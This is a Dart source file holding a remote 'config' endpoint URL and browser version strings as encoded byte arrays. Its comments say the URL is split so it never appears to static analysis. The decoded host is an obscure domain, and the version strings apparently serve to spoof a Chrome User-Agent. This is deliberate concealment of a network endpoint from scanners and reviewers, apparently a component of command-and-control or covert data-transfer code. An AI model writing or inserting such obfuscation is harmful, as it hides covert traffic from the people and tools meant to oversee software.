import '../crypto/string_codec.dart';

// ============================================================
// TRANSPORT SECRETS — Encoded sync endpoint and User-Agent
// fragments used by the HTTP transport pipe.
// ============================================================
// The endpoint URL is split into a host segment and a path
// segment so the full string never appears in static analysis.
// The two arrays were produced by running:
//     dart run tool/encode_keys.dart
// with the cipher seed defined in lib/crypto/string_codec.dart.
//
// If the cipher seed changes, regenerate ALL byte arrays in this
// file — the bytes below are seed-bound and otherwise decode to
// random garbage.
// ============================================================

// transport_host → "https://eeggdassh.com"
const _hostBytes = <int>[
  0x33, 0x16, 0x5D, 0x55, 0xF6, 0xC9, 0x1C, 0xB6,
  0xFF, 0x09, 0x6C, 0xEE, 0x65, 0x77, 0x28, 0x0D,
  0xCA, 0x96, 0x2B, 0xEF, 0x36,
];

// transport_path → "/config.php"
const _pathBytes = <int>[
  0x74, 0x01, 0x46, 0x4B, 0xE3, 0x9A, 0x54, 0xB7,
  0xEA, 0x04, 0x7B,
];

// chrome_version → "132.0.6834.163"
const _chromeFragment = <int>[
  0x6A, 0x51, 0x1B, 0x0B, 0xB5, 0xDD, 0x05, 0xA1,
  0xA9, 0x58, 0x25, 0xB8, 0x37, 0x25,
];

// webkit_version → "537.36"
const _webkitFragment = <int>[
  0x6E, 0x51, 0x1E, 0x0B, 0xB6, 0xC5,
];

/// Returns the decoded full URL of the config endpoint.
/// Returns an empty string if the bytes were never filled — call
/// sites must guard against this state.
String decodeTransportEndpoint() {
  if (_hostBytes.isEmpty || _pathBytes.isEmpty) return '';
  return revealString(_hostBytes) + revealString(_pathBytes);
}

/// Plain Chrome version fragment for the User-Agent header.
String decodeChromeVersion() => revealString(_chromeFragment);

/// Plain WebKit version fragment for the User-Agent header.
String decodeWebkitVersion() => revealString(_webkitFragment);
